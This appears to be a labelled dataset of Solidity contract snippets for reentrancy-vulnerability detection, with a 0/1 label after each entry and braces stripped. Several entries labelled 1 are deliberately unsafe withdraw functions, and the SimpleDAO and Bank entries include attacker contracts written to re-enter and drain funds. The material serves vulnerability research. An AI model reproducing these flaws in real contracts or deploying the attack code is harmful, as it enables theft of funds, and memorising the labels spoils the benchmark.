Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
161 cross-function-reentrancy.sol
function untrustedWithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
if (recipient.call.value(amountToWithdraw)() == false) { throw;}
function untrustedGetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) { throw;}
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
claimedBonus[recipient] = true;
1
---------------------------------
162 27024.sol
function participate() payable onlyHuman {
require(msg.value == 0.1 ether);
require(!participated[msg.sender]);
if (luckyNumberOfAddress(msg.sender) == winnerLuckyNumber) {
participated[msg.sender] = true;
require(msg.sender.call.value(this.balance)());
0
---------------------------------
163 25196.sol
function getTokens(uint num, address tokenBuyerContract) public {
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
tokenBuyerContract.call.value(0 wei)();
0
---------------------------------
164 39973.sol
function _unsafeSend(address _to, uint _value) internal returns(bool) {
return _to.call.value(_value)();
function _forward(address _to, bytes _data) internal returns(bool, bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return (false, _safeFalse());
if (!_to.call.value(msg.value)(_data)) {
return (false, _safeFalse());
return (true, _applyRefund(startGas));
function checkForward(bytes _data) constant returns(bool, bool) {
return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data);
1
---------------------------------
165 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
166 10715.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
1
---------------------------------
167 5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
168 39191.sol
function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {
if (self.accountBalances[accountAddress] >= value) {
deductFunds(self, accountAddress, value);
if (!accountAddress.send(value)) {
if (!accountAddress.call.value(value)()) {  throw; }
return true;
return false;
0
---------------------------------
169 14995.sol
function fund() public payable
if (dateSaleStarted==0 || now < dateSaleStarted)
return _errorBuyingTokens("CrowdSale has not yet started.");
if (now > dateSaleEnded)
return _errorBuyingTokens("CrowdSale has ended.");
if (totalRaised >= hardCap)
return _errorBuyingTokens("HardCap has been reached.");
if (msg.value % 1000000000 != 0)
return _errorBuyingTokens("Must send an even amount of GWei.");
if (!wasSaleStarted) {
wasSaleStarted = true;
emit SaleStarted(now);
uint _amtToFund = (totalRaised + msg.value) > hardCap ? hardCap - totalRaised : msg.value;
uint _numTokens = getTokensFromEth(_amtToFund);
token.mint(msg.sender, _numTokens);
totalRaised += _amtToFund;
emit BuyTokensSuccess(now, msg.sender, _amtToFund, _numTokens);
if (totalRaised < softCap) {
amtFunded[msg.sender] += _amtToFund;
uint _refund = msg.value > _amtToFund ? msg.value - _amtToFund : 0;
if (_refund > 0){
require(msg.sender.call.value(_refund)());
emit UserRefunded(now, msg.sender, _refund);
function endSale() public
require(wasSaleStarted && !wasSaleEnded);
require(totalRaised >= hardCap || now > dateSaleEnded);
wasSaleEnded = true;
wasSoftCapMet = totalRaised >= softCap;
if (!wasSoftCapMet) {
token.mint(wallet, 1e30);
emit SaleFailed(now);
return;
token.freeze(false);
uint _lockerAmt = token.totalSupply() / 4;
token.mint(locker, _lockerAmt);
locker.startVesting(_lockerAmt, 600);
uint _capitalAmt = (totalRaised * capitalPctBips) / 10000;
if (address(this).balance < _capitalAmt) _capitalAmt = address(this).balance;
treasury.addCapital.value(_capitalAmt)();
if (wallet.call.value(address(this).balance)()) {}
emit SaleSuccessful(now);
function refund() public
require(wasSaleEnded && !wasSoftCapMet);
require(amtFunded[msg.sender] > 0);
uint _amt = amtFunded[msg.sender];
amtFunded[msg.sender] = 0;
require(msg.sender.call.value(_amt)());
emit UserRefunded(now, msg.sender, _amt);
function fundCapital() public payable
if (!wasSaleEnded)
return _errorBuyingTokens("Sale has not ended.");
if (!wasSoftCapMet)
return _errorBuyingTokens("SoftCap was not met.");
uint _amtNeeded = capitalFundable();
uint _amount = msg.value > _amtNeeded ? _amtNeeded : msg.value;
if (_amount == 0) {
return _errorBuyingTokens("No capital is needed.");
totalRaised += _amount;
token.mint(msg.sender, _amount);
treasury.addCapital.value(_amount)();
emit BuyTokensSuccess(now, msg.sender, _amount, _amount);
uint _refund = msg.value > _amount ? msg.value - _amount : 0;
if (_refund > 0) {
require(msg.sender.call.value(_refund)());
emit UserRefunded(now, msg.sender, _refund);
function _errorBuyingTokens(string _reason) private
require(msg.sender.call.value(msg.value)());
emit BuyTokensFailure(now, msg.sender, _reason);
function collectOwedDividends() public returns (uint _amount)
_updateCreditedPoints(msg.sender);
_amount = creditedPoints[msg.sender] / POINTS_PER_WEI;
creditedPoints[msg.sender] = 0;
dividendsCollected += _amount;
emit CollectedDividends(now, msg.sender, _amount);
require(msg.sender.call.value(_amount)());
function collect() public
require(msg.sender == owner);
token.collectOwedDividends();
uint _amount = address(this).balance;
if (_amount > 0) require(owner.call.value(_amount)());
emit Collected(now, owner, _amount);
0
---------------------------------
170 740.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
require(_value > 0 && frozenAccount[msg.sender] == false && frozenAccount[_to] == false && now > unlockUnixTime[msg.sender]  && now > unlockUnixTime[_to]);
if (isContract(_to)) {
require(balanceOf[msg.sender] >= _value);
balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
balanceOf[_to] = balanceOf[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
171 14994.sol
function collectOwedDividends() public returns (uint _amount) {
_updateCreditedPoints(msg.sender);
_amount = creditedPoints[msg.sender] / POINTS_PER_WEI;
creditedPoints[msg.sender] = 0;
dividendsCollected += _amount;
emit CollectedDividends(now, msg.sender, _amount);
require(msg.sender.call.value(_amount)());
0
---------------------------------
172 14758.sol
function wcf(address target, uint256 a) payable {
require(msg.sender == owner);
uint startBalance = this.balance;
target.call.value(msg.value)(bytes4(keccak256("play(uint256)")), a);
if (this.balance <= startBalance) revert();
owner.transfer(this.balance);
0
---------------------------------
173 39190.sol
function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {
if (self.accountBalances[accountAddress] >= value) {
deductFunds(self, accountAddress, value);
if (!accountAddress.send(value)) {
if (!accountAddress.call.value(value)()) {
throw;
return true;
return false;
uint constant DEFAULT_SEND_GAS = 100000;
function execute(Call storage self, uint start_gas, address executor, uint overhead, uint extraGas) public {
FutureCall call = FutureCall(this);
self.wasCalled = true;
if (self.abiSignature == EMPTY_SIGNATURE && self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)();
else if (self.abiSignature == EMPTY_SIGNATURE) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.callData);
else if (self.callData.length == 0) {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature);
else {
self.wasSuccessful = self.contractAddress.call.value(self.callValue).gas(msg.gas - overhead)(self.abiSignature, self.callData);
call.origin().call(bytes4(sha3("updateDefaultPayment()")));
uint gasScalar = getGasScalar(self.anchorGasPrice, tx.gasprice);
uint basePayment;
if (self.claimer == executor) {
basePayment = self.claimAmount;
else {
basePayment = call.basePayment();
uint payment = self.claimerDeposit + basePayment * gasScalar / 100;
uint donation = call.baseDonation() * gasScalar / 100;
self.claimerDeposit = 0;
uint gasCost = tx.gasprice * (start_gas - msg.gas + extraGas);
payment = sendSafe(executor, payment + gasCost);
donation = sendSafe(creator, donation);
CallExecuted(executor, gasCost, payment, donation, self.wasSuccessful);
event Cancelled(address indexed cancelled_by);
0
---------------------------------
174 21697.sol
function Jump() public payable {
if(msg.value > 1 ether)  {
msg.sender.call.value(this.balance);
0
---------------------------------
175 35806.sol
function withdraw(uint amount) {
require(tokens[0][msg.sender] >= amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);
require(msg.sender.call.value(amount)());
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
176 40241.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
177 8342.sol
function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyCommittee returns (bool) {
return _to.call.value(_value).gas(_gas)(_code);
0
---------------------------------
178 dumbDAO.sol
function withdraw(address _recipient) returns (bool) {
if (balances[msg.sender] == 0){
InsufficientFunds(balances[msg.sender],balances[msg.sender]);
throw;
PaymentCalled(_recipient, balances[msg.sender]);
if (_recipient.call.value(balances[msg.sender])()) {
balances[msg.sender] = 0;
return true;
1
---------------------------------
179 Bank.sol
function withdraw() {
require(msg.sender.call.value(balances[msg.sender])());
balances[msg.sender]=0;
contract Attacker{
address public bankAddr;
uint attackCount = 0;
constructor(address _bank){
bankAddr = _bank;
1
---------------------------------
180 40090.sol
function multiAccessCallD(address _to, uint _value, bytes _data, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _to, _value, _data)) returns(bool) {
return _to.call.value(_value)(_data);
function() returns(bool) {
return multiAccessCall(multiAccessRecipient, msg.value, msg.data);
function multiAccessCall(address _to, uint _value, bytes _data) returns(bool) {
return this.multiAccessCallD(_to, _value, _data, msg.sender);
0
---------------------------------
181 17043.sol
function withdraw() public {
msg.sender.call.value(balances[msg.sender])();
balances[msg.sender] = 0;
1
---------------------------------
182 31912.sol
function serveTx(WalletData storage self, address _to, uint256 _value,  bytes _txData,  bool _confirm, bytes _data) public returns (bool,bytes32) {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
183 39817.sol
function callDividend(address token_) owned {
assert(tokenManage[token_].hasDividend);
assert(tokenManage[token_].divContractAddress.call.value(0)(tokenManage[token_].divData));
function buyEther(uint256 amount) {
assert(valueToToken(etherContract,balances[msg.sender]) >= amount);
assert(destroyValue(msg.sender, tokenToValue(etherContract,amount)));
assert(msg.sender.call.value(amount)());
Buy(etherContract, msg.sender, amount, balances[msg.sender]);
function quickTrade(address tokenFrom, address tokenTo, uint256 input) payable drainBlock {
uint256 inValue;
uint256 tempInValue = safeAdd(tokenToValue(etherContract,msg.value),
tokenToValue(tokenFrom,input));
inValue = valueWithFee(tempInValue);
uint256 outValue = valueToToken(tokenTo,inValue);
assert(verifiedTransferFrom(tokenFrom,msg.sender,input));
if (tokenTo == etherContract){
assert(msg.sender.call.value(outValue)());
} else
assert(Token(tokenTo).transfer(msg.sender, outValue));
Trade(tokenFrom, tokenTo, msg.sender, inValue);
function takeEtherProfits(){
ShopKeeper(shopKeeperLocation).splitProfits();
ValueTrader shop = ValueTrader(shopLocation);
shop.buyEther(shop.balanceOf(this));
assert(profitContainerLocation.call.value(this.balance)());
0
---------------------------------
184 21241.sol
function finish() onlyOwner saleCompletedSuccessfully public {
uint256 freeEthers = address(this).balance * 40 / 100;
uint256 vestedEthers = address(this).balance - freeEthers;
address(0xd1B10607921C78D9a00529294C4b99f1bd250E1c).transfer(freeEthers);
assert(address(0x0285d35508e1A1f833142EB5211adb858Bd3323A).call.value(vestedEthers)());
AuctusToken token = AuctusToken(auctusTokenAddress);
token.setTokenSaleFinished();
if (remainingTokens > 0) {
token.burn(remainingTokens);
remainingTokens = 0;
0
---------------------------------
185 SimpleDAO.sol
function withdraw(uint amount) {
if (credit[msg.sender]>= amount) {
msg.sender.call.value(amount)();
credit[msg.sender]-=amount;
function getJackpot() {
owner.send(this.balance);
function() {
dao.withdraw(dao.queryCredit(this));
contract Mallory2 {
SimpleDAO public dao;
address owner;
bool public performAttack = true;
function attack()  {
dao.donate.value(1)(this);
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
function getJackpot(){
dao.withdraw(dao.balance);
owner.send(this.balance);
performAttack = true;
function() {
if (performAttack) {
performAttack = false;
dao.withdraw(1);
1
---------------------------------
186 32605.sol
function forward(address destination, uint value, bytes data) public onlyOwner {
require(destination.call.value(value)(data));
Forwarded(destination, value, data);
contract MetaIdentityManager {
uint adminTimeLock;
uint userTimeLock;
uint adminRate;
address relay;
event LogIdentityCreated(address indexed identity, address indexed creator, address owner, address indexed recoveryKey);
event LogOwnerAdded(address indexed identity, address indexed owner, address instigator);
event LogOwnerRemoved(address indexed identity, address indexed owner, address instigator);
event LogRecoveryChanged(address indexed identity, address indexed recoveryKey,address instigator);
event LogMigrationInitiated(address indexed identity, address indexed newIdManager, address instigator);
event LogMigrationCanceled(address indexed identity, address indexed newIdManager, address instigator);
event LogMigrationFinalized(address indexed identity, address indexed newIdManager, address instigator);
mapping(address => mapping(address => uint)) owners;
mapping(address => address) recoveryKeys;
mapping(address => mapping(address => uint)) limiter;
mapping(address => uint) public migrationInitiated;
mapping(address => address) public migrationNewAddress;
modifier onlyAuthorized() {
require(msg.sender == relay || checkMessageData(msg.sender));
modifier onlyOwner(address identity, address sender) {
require(isOwner(identity, sender));
modifier onlyOlderOwner(address identity, address sender) {
require(isOlderOwner(identity, sender));
modifier onlyRecovery(address identity, address sender) {
require(recoveryKeys[identity] == sender);
modifier rateLimited(Proxy identity, address sender) {
require(limiter[identity][sender] < (now - adminRate));
limiter[identity][sender] = now;
modifier validAddress(address addr) {
require(addr != address(0));
function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) {
Proxy identity = new Proxy();
owners[identity][owner] = now - adminTimeLock;
recoveryKeys[identity] = recoveryKey;
LogIdentityCreated(identity, msg.sender, owner,  recoveryKey);
identity.forward(destination, 0, data);
function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){
identity.forward(destination, value, data);
0
---------------------------------
187 22416.sol
function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable {
if(Holders[_addr]>0)  {
if(_addr.call.value(_wei)()){
Holders[_addr]-=_wei;
1
---------------------------------
188 9920.sol
function tryExec(address target, bytes calldata, uint value) internal returns (bool call_ret){
return target.call.value(value)(calldata);
function exec(address target, bytes calldata, uint value) internal {
if(!tryExec(target, calldata, value)) {
throw;
function tryExec( address t, bytes c ) internal returns (bool) {
return tryExec(t, c, 0);
function tryExec( address t, uint256 v ) internal returns (bool) {
bytes memory c; return tryExec(t, c, v);
0
---------------------------------
189 1403.sol
function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool success) {
_transfer( msg.sender, to, value, data );
if (isContract(to) ) {
ContractReceiver rx = ContractReceiver(to);
require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data));
return true;
function transfer(address to, uint256 value) public returns (bool success) {
bytes memory empty;
_transfer(msg.sender, to, value, empty);
return true;
function transferFrom(address from, address to, uint256 value) public returns (bool success) {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer(from, to, value, empty);
return true;
function transfer(address to, uint value, bytes data) public returns (bool success) {
if (isContract(to)) {
return transferToContract(to, value, data);
_transfer(msg.sender, to, value, data );
return true;
function transferToContract(address to, uint value, bytes data) private returns (bool success) {
_transfer(msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback( msg.sender, value, data );
return true;
1
---------------------------------
190 simple_dao.sol
function withdraw(uint amount) public{
if (credit[msg.sender]>= amount) {
require(msg.sender.call.value(amount)());
credit[msg.sender]-=amount;
1
---------------------------------
191 40118.sol
function withdrawEtherOrThrow(uint256 amount) private {
if (msg.sender != owner) throw;
bool result = owner.call.value(amount)();
if (!result) { throw;}
function refund() noEther onlyOwner {
if (tokenBalance == 0) throw;
tokenBalance = 0;
withdrawEtherOrThrow(tokenBalance * tokenPrice);
0
---------------------------------
192 32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
193 17518.sol
function sendTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
194 21900.sol
function crowdsale() public payable returns (bool) {
require(msg.value >= limit);
uint256 vv = msg.value;
uint256 coin = crowdsalePrice.mul(vv);
require(coin.add(totalSupply) <= supplyLimit);
require(crowdsaleSupply.add(coin) <= crowdsaleTotal);
balances[msg.sender] = coin.add(balances[msg.sender]);
totalSupply = totalSupply.add(coin);
crowdsaleSupply = crowdsaleSupply.add(coin);
balances[msg.sender] = coin;
require(owner.call.value(msg.value)());
return true;
contract GGPCToken is Crowdsale {
string public name = "Global game payment currency";
string public symbol = "GGPC";
string public version = '1.0.2';
0
---------------------------------
195 14945.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
0
---------------------------------
196 33450.sol
function executeTransaction(bytes32 TransHash) public notExecuted(TransHash){
if (isConfirmed(TransHash)) {
Transactions[TransHash].executed = true;
require(Transactions[TransHash].destination.call.value(Transactions[TransHash].value)(Transactions[TransHash].data));
Execution(TransHash);
function confirmTransaction(bytes32 TransHash) public onlyOwner(){
addConfirmation(TransHash);
executeTransaction(TransHash);
0
---------------------------------
197 40469.sol
function _forward(address _to, bytes _data) internal returns(bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return false;
_to.call.value(msg.value)(_data);
return _applyRefund(startGas);
0
---------------------------------
198 18170.sol
function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() {
require(_amount <= wingsETHRewards);
require(_contract.call.value(_amount)());
wingsETHRewards -= _amount;
0
---------------------------------
199 40092.sol
function withdrawPayments() external returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) { throw; }
success = true;
0
---------------------------------
200 4591.sol
function finishDistribution() onlyOwner canDistr public returns (bool) {
crowdsaleClosed = true;
uint256 amount = tokenReward.sub(amountRaisedIsc);
balances[beneficiary] = balances[beneficiary].add(amount);
emit Transfer(address(0), beneficiary, amount);
require(msg.sender.call.value(amountRaised)());
return true;
0
---------------------------------
201 TokenWithInvariants.sol
function withdraw() checkInvariants {
uint balance = balanceOf[msg.sender];
if (msg.sender.call.value(balance)()) {
totalSupply -= balance;
balanceOf[msg.sender] = 0;
1
---------------------------------
202 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
203 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
204 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
205 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
206 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
207 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
208 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
209 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
210 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
211 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
212 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
213 33501.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
214 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
215 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
---------------------------------
216 21111.sol
function submitPool(uint amountInWei) public onlyOwner noReentrancy {
require(contractStage < 3);
require(receiverAddress != 0x00);
require(block.number >= addressChangeBlock.add(6000));
require(contributionMin <= amountInWei && amountInWei <= this.balance);
finalBalance = this.balance;
require(receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());
if (this.balance > 0) ethRefundAmount.push(this.balance);
contractStage = 3;
PoolSubmitted(receiverAddress, amountInWei);
0
